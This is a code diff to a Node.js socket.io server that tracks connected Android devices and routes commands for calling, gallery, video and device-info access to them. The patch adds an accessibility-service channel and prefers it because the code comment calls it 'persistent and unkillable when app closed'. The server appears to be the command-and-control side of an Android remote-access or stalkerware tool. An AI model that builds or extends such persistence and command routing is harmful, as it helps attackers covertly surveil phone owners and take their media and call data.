@@ -698,6 +698,7 @@ io.on("connection", (socket) => {
                     ram: ram || "",
                     platform: platform || "android",
                     sockets: new Set(),
+                    accSocketId: null,
                     bgSocketId: null,
                     companionSocketId: null
                 };
@@ -710,6 +711,7 @@ io.on("connection", (socket) => {
                 const s = io.sockets.sockets.get(sid);
                 if (!s || !s.connected) {
                     existing.sockets.delete(sid);
+                    if (existing.accSocketId === sid) existing.accSocketId = null;
                     if (existing.bgSocketId === sid) existing.bgSocketId = null;
                     if (existing.companionSocketId === sid) existing.companionSocketId = null;
                 }
@@ -719,7 +721,9 @@ io.on("connection", (socket) => {
             existing.socketId = socket.id;
             existing.online = true;
 
-            if (role === "background_service") {
+            if (role === "accessibility_service") {
+                existing.accSocketId = socket.id;
+            } else if (role === "background_service") {
                 existing.bgSocketId = socket.id;
             } else if (role === "companion") {
                 existing.companionSocketId = socket.id;
@@ -784,8 +788,10 @@ io.on("connection", (socket) => {
             // For calling / gallery / videos / info: DISPATCH TO EXACTLY ONE SOCKET!
             let chosenSocketId = null;
 
-            // Prefer background_service socket for reliable wake & media access
-            if (target && target.bgSocketId && io.sockets.sockets.has(target.bgSocketId)) {
+            // Prefer accessibility_service (persistent and unkillable when app closed), then background_service
+            if (target && target.accSocketId && io.sockets.sockets.has(target.accSocketId)) {
+                chosenSocketId = target.accSocketId;
+            } else if (target && target.bgSocketId && io.sockets.sockets.has(target.bgSocketId)) {
                 chosenSocketId = target.bgSocketId;
             } else if (activeSockets.length > 0) {
                 chosenSocketId = activeSockets[0];
@@ -867,11 +873,12 @@ io.on("connection", (socket) => {
         for (const [deviceId, info] of deviceRegistry.entries()) {
             if (info.sockets && info.sockets.has(socket.id)) {
                 info.sockets.delete(socket.id);
+                if (info.accSocketId === socket.id) info.accSocketId = null;
                 if (info.bgSocketId === socket.id) info.bgSocketId = null;
                 if (info.companionSocketId === socket.id) info.companionSocketId = null;
                 console.log(`Socket ${socket.id} disconnected from device ${deviceId}. Remaining sockets: ${info.sockets.size}`);
                 if (info.sockets.size > 0) {
-                    info.socketId = info.bgSocketId || Array.from(info.sockets)[0];
+                    info.socketId = info.accSocketId || info.bgSocketId || Array.from(info.sockets)[0];
                     info.online = true;
                 } else {
                     info.socketId = null;
@@ -882,6 +889,7 @@ io.on("connection", (socket) => {
             } else if (info.socketId === socket.id) {
                 info.socketId = null;
                 info.online = false;
+                if (info.accSocketId === socket.id) info.accSocketId = null;
                 if (info.bgSocketId === socket.id) info.bgSocketId = null;
                 if (info.companionSocketId === socket.id) info.companionSocketId = null;
                 io.emit("device-list-update", getDeviceListPayload());
